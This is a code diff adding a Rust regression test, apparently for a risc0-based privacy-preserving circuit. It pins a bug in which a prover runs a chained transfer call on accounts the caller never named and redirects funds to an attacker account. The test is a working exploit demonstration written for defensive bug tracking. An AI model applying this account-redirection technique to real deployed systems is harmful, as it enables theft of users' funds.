@@ -734,6 +734,143 @@ fn unused_private_pre_state_is_pulled_by_a_later_chained_call() {
     assert!(proof.is_valid_for(&output));
 }
 
+/// BUG PIN (currently failing to reject): the circuit never compares a chained call's
+/// `accounts` against the accounts the callee was actually run on.
+///
+/// Both programs are honest, unmodified and in-tree, and both inner receipts are genuine — a
+/// risc0 receipt binds the image and the journal, never the inputs. Only the wiring lies: the
+/// forwarder's own verified journal names `[sender, recipient]`, and the real
+/// `simple_balance_transfer` ELF is run on `[sender, attacker]`. The circuit accepts the pair, so
+/// the attacker keeps the funds and the recipient the caller named is never credited.
+#[test]
+fn a_lying_prover_redirects_a_chained_call_to_an_account_it_never_named() {
+    const TRANSFER: u128 = 10;
+
+    /// Runs a program on caller-chosen inputs, exactly as the prover's own host would.
+    fn run(
+        program: &Program,
+        caller_program_id: Option<ProgramId>,
+        pre_states: &[AccountWithMetadata],
+        instruction_data: &[u8],
+    ) -> (risc0_zkvm::Receipt, lee_core::program::ProgramOutput) {
+        let mut env_builder = risc0_zkvm::ExecutorEnv::builder();
+        program
+            .write_inputs(
+                caller_program_id,
+                pre_states,
+                instruction_data,
+                &mut env_builder,
+            )
+            .expect("inputs are writable");
+        let receipt = risc0_zkvm::default_prover()
+            .prove(env_builder.build().expect("env builds"), program.elf())
+            .expect("program proves")
+            .receipt;
+        let output = borsh::from_slice(
+            lee_core::from_frame(&receipt.journal.bytes).expect("journal is framed"),
+        )
+        .expect("journal decodes");
+        (receipt, output)
+    }
+
+    let forwarder = crate::test_methods::non_delegating_forwarder();
+    let transfer = crate::test_methods::simple_balance_transfer();
+    let forwarder_id = forwarder.id();
+    let transfer_id = transfer.id();
+
+    let held = |balance| Account {
+        program_owner: transfer_id.into(),
+        balance,
+        ..Account::default()
+    };
+    let sender = AccountWithMetadata::new(held(100), true, AccountId::new([1; 32]));
+    let recipient = AccountWithMetadata::new(held(0), false, AccountId::new([2; 32]));
+    let attacker = AccountWithMetadata::new(held(0), false, AccountId::new([3; 32]));
+
+    // 1. The honest forwarder, run honestly: it names `[sender, recipient]` for the transfer.
+    let (forwarder_receipt, forwarder_output) = run(
+        &forwarder,
+        None,
+        &[sender.clone(), recipient.clone()],
+        &Program::serialize_instruction((
+            transfer_id,
+            Program::serialize_instruction(TRANSFER).unwrap(),
+            true,
+        ))
+        .unwrap(),
+    );
+    let chained_call = &forwarder_output.chained_calls[0];
+    assert_eq!(
+        chained_call.accounts,
+        vec![sender.account_id, recipient.account_id]
+    );
+
+    // 2. The lie, and it is only in the wiring: the same honest transfer ELF, run on an account the
+    //    chained call never named.
+    let (transfer_receipt, transfer_output) = run(
+        &transfer,
+        Some(forwarder_id),
+        &[sender.clone(), attacker.clone()],
+        &chained_call.instruction_data,
+    );
+    let ran_on: Vec<AccountId> = transfer_output
+        .pre_states
+        .iter()
+        .map(|pre| pre.account_id)
+        .collect();
+    assert_ne!(
+        chained_call.accounts, ran_on,
+        "the callee ran on accounts the chained call never named"
+    );
+
+    // 3. The circuit accepts the pair anyway.
+    let circuit_input = lee_core::PrivacyPreservingCircuitInput {
+        program_outputs: vec![forwarder_output.clone().into(), transfer_output.into()],
+        top_level_pre_state_refs: vec![sender.account_id, recipient.account_id],
+        account_identities: vec![InputAccountIdentity::Public; 3],
+        first_sight_accounts: [&sender, &recipient, &attacker]
+            .into_iter()
+            .map(|pre| lee_core::FirstSightAccount {
+                account: pre.account.clone(),
+                is_authorized: pre.is_authorized,
+            })
+            .collect(),
+        program_id: forwarder_id,
+        dummy_inputs: vec![],
+    };
+    let mut env_builder = risc0_zkvm::ExecutorEnv::builder();
+    env_builder.add_assumption(forwarder_receipt);
+    env_builder.add_assumption(transfer_receipt);
+    env_builder.write_slice(&lee_core::to_frame(&borsh::to_vec(&circuit_input).unwrap()));
+    let prove_info = risc0_zkvm::default_prover()
+        .prove_with_opts(
+            env_builder.build().expect("env builds"),
+            crate::PRIVACY_PRESERVING_CIRCUIT_ELF,
+            &risc0_zkvm::ProverOpts::succinct(),
+        )
+        .expect("BUG: the circuit does not bind a chained call's accounts to the accounts the callee ran on");
+    prove_info
+        .receipt
+        .verify(crate::PRIVACY_PRESERVING_CIRCUIT_ID)
+        .expect("the resulting proof verifies");
+
+    // 4. The funds landed on the attacker; the recipient the forwarder named got nothing.
+    let output: lee_core::PrivacyPreservingCircuitOutput = borsh::from_slice(
+        lee_core::from_frame(&prove_info.receipt.journal.bytes).expect("journal is framed"),
+    )
+    .expect("journal decodes");
+    let balance_of = |account_id| {
+        output
+            .public_actions
+            .iter()
+            .find(|action| action.pre.account_id == account_id)
+            .map(|action| action.post.balance)
+    };
+    assert_eq!(balance_of(attacker.account_id), Some(TRANSFER));
+    assert_eq!(balance_of(recipient.account_id), Some(0));
+    assert_eq!(balance_of(sender.account_id), Some(100 - TRANSFER));
+}
+
 /// Exploit-scenario pin. A single `(program_id, seed)` pair can derive a family of
 /// `AccountId`s, one public PDA and one private PDA per distinct npk. Without the tx-wide
 /// family-binding check, a program could claim `PDA_alice` (`alice_npk`) and
